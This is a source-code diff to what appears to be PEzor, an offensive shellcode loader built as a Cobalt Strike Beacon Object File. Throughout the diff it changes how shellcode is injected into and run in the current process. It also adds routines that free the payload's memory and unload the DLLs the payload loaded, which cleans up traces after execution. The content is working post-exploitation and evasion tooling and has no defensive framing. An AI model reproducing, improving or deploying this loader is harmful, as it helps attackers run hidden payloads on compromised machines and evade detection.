@@ -71,6 +71,9 @@ extern "C" DECLSPEC_IMPORT WINBASEAPI LPVOID   WINAPI  KERNEL32$VirtualAlloc(LPV
 extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
 #define VirtualFree KERNEL32$VirtualFree
 
+extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);
+#define VirtualFreeEx KERNEL32$VirtualFreeEx
+
 extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
 #define VirtualProtect KERNEL32$VirtualProtect
 
@@ -207,6 +210,7 @@ BOOL createConsole() {
     return TRUE;
 }
 
+#ifdef _CLEANUP_
 BOOL isPresentInArray(HMODULE loadedModules[], HMODULE targetModule) {
     for (unsigned int i = 0; i < ARRAY_MODULES_SIZE; i++) {
         if (loadedModules[i] == targetModule) {
@@ -235,6 +239,26 @@ BOOL cleanupModules(HMODULE loadedModules[]) {
 
     return wasLibraryFreed;
 }
+
+BOOL cleanupModules2(unsigned int numberOfLoadedModules) {
+    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];
+    DWORD cbNeeded = -1;
+    BOOL wasLibraryFreed = FALSE;
+
+    numberOfLoadedModules -= 9; // numbers of modules loaded by the bof itself
+
+    __stosb((unsigned char*)hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));
+
+    if (EnumProcessModules((HANDLE)-1, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {
+        for (unsigned int i = numberOfLoadedModules; i < (cbNeeded / sizeof(HMODULE)); i++) {
+            FreeLibrary(hMods[i]);
+            wasLibraryFreed = TRUE;
+        }
+    }
+
+    return wasLibraryFreed;
+}
+#endif
 
 #ifndef _BOF_
 DWORD WINAPI helloWorld(LPVOID lpParam) {
@@ -274,7 +298,7 @@ int go(char * args, int alen) {
     #endif
 
     #ifdef _BOF_
-    BeaconPrintf(CALLBACK_OUTPUT, "Starting BOF...");
+    BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] starting BOF...");
     #endif
 
     __stosb((unsigned char*)loadedModules, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));
@@ -301,16 +325,16 @@ int go(char * args, int alen) {
         &dwThreadId);
     #else
     HANDLE hThread = INVALID_HANDLE_VALUE;
-    NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, FALSE, 0);
-    if (NT_FAIL(status) || hThread == (HANDLE)-1) {
+    LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, 0);
+    if (!allocation || hThread == (HANDLE)-1) {
         restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
         #ifdef _BOF_
-        BeaconPrintf(CALLBACK_ERROR, "inject_shellcode_self: ERROR 0x%x", status);
-        printf("inject_shellcode_self: ERROR 0x%x", status);
+        BeaconPrintf(CALLBACK_ERROR, "inject_shellcode_self: ERROR 0x%x", allocation);
+        printf("inject_shellcode_self: ERROR 0x%x", allocation);
         #else
-        printf("inject_shellcode_self: ERROR 0x%x", status);
+        printf("inject_shellcode_self: ERROR 0x%x", allocation);
         #endif
-        return status;
+        return -1;
     }
     #endif
 
@@ -390,16 +414,29 @@ int go(char * args, int alen) {
     CloseHandle(pipeWriteError);
     CloseHandle(pipeReadError);
 
-    if (cleanupModules(loadedModules)) {
+    #ifdef _CLEANUP_
+    //if (cleanupModules(loadedModules)) {
+    if (cleanupModules2(cbNeeded / sizeof(HMODULE))) {
         // some module was freed
         #ifdef _BOF_
-        BeaconPrintf(CALLBACK_OUTPUT, "Cleanup complete");
+        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] cleanup complete");
         #endif
     } else {
         #ifdef _BOF_
-        BeaconPrintf(CALLBACK_OUTPUT, "No cleanup needed");
+        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] no cleanup needed");
         #endif
     }
+
+    if (VirtualFreeEx((HANDLE)-1, allocation, 0, MEM_RELEASE)) {
+        #ifdef _BOF_
+        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] payload freed");
+        #endif
+    } else {
+        #ifdef _BOF_
+        BeaconPrintf(CALLBACK_ERROR, "[PEzor] error when freeing payload");
+        #endif
+    }
+    #endif
 
     return 0;
 }
